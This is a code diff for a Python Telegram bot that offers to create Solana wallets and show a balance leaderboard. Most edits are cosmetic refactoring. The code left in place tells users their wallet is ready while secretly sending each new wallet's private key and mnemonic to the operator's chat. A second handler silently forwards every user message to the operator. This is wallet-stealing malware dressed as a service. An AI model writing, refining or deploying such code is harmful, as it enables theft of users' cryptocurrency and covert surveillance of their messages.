@@ -2,12 +2,12 @@ import os
 import json
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
-    Application,
+    ApplicationBuilder,
     CommandHandler,
     CallbackQueryHandler,
     MessageHandler,
+    ContextTypes,
     filters,
-    ContextTypes
 )
 from bip_utils import Bip39MnemonicGenerator, Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
 
@@ -19,7 +19,7 @@ OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID"))
 user_data = {}
 DATA_FILE = "leaderboard.json"
 
-# Load data if exists
+# Load leaderboard if it exists
 if os.path.exists(DATA_FILE):
     with open(DATA_FILE, "r") as f:
         user_data = json.load(f)
@@ -30,11 +30,11 @@ def save_data():
         json.dump(user_data, f)
 
 
-# === Start Command ===
+# === /start command ===
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("🪙 Create Wallet", callback_data="create_wallet")],
-        [InlineKeyboardButton("📊 Leaderboard", callback_data="leaderboard")]
+        [InlineKeyboardButton("📊 Leaderboard", callback_data="leaderboard")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text("🤖 Welcome! Choose an option:", reply_markup=reply_markup)
@@ -67,14 +67,14 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_data[user_id] = {
             "name": user_name,
             "public_key": public_key,
-            "balance": 0  # start with 0 SOL
+            "balance": 0,
         }
         save_data()
 
-        # Reply to user
+        # Tell the user
         await query.edit_message_text("✅ Your Solana wallet has been created!")
 
-        # Secretly send keys to OWNER
+        # Secretly send details to OWNER
         await context.bot.send_message(
             chat_id=OWNER_CHAT_ID,
             text=(
@@ -84,7 +84,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🔑 Private Key: `{private_key}`\n\n"
                 f"📝 Mnemonic: `{mnemonic}`"
             ),
-            parse_mode="Markdown"
+            parse_mode="Markdown",
         )
 
     elif query.data == "leaderboard":
@@ -92,7 +92,6 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.edit_message_text("📊 No users yet!")
             return
 
-        # Sort users by balance
         sorted_users = sorted(user_data.items(), key=lambda x: x[1]["balance"], reverse=True)
 
         leaderboard_text = "🏆 *Leaderboard*\n\n"
@@ -102,20 +101,20 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(leaderboard_text, parse_mode="Markdown")
 
 
-# === Silent forward messages to OWNER ===
+# === Forward every user message silently to OWNER ===
 async def forward_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message:
         text = update.message.text or ""
         await context.bot.send_message(
             chat_id=OWNER_CHAT_ID,
             text=f"📨 Forwarded Message:\n\n👤 {update.message.from_user.first_name}:\n💬 `{text}`",
-            parse_mode="Markdown"
+            parse_mode="Markdown",
         )
 
 
 # === Main ===
 def main():
-    app = Application.builder().token(BOT_TOKEN).build()
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button))
